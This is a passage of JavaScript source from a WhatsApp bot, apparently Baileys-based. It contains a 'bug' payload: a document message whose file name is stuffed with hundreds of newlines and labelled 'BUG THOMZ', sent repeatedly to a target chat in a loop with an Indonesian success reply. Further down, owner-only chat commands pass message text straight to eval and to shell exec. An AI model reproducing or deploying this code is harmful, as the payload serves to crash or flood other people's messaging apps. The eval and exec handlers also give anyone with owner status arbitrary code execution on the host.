"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.BUG THOMZ`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${botname} ${buttonkal}`,
}

}), { userJid: from, quoted:thomz})
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
await sleep(2000)
}
reply("sukses bang thomz jangan lupa di tunggu 1 menit")
break
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply('*khusus Premium*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply('*khusus Premium*')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return m.reply('*khusus Premium*')
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
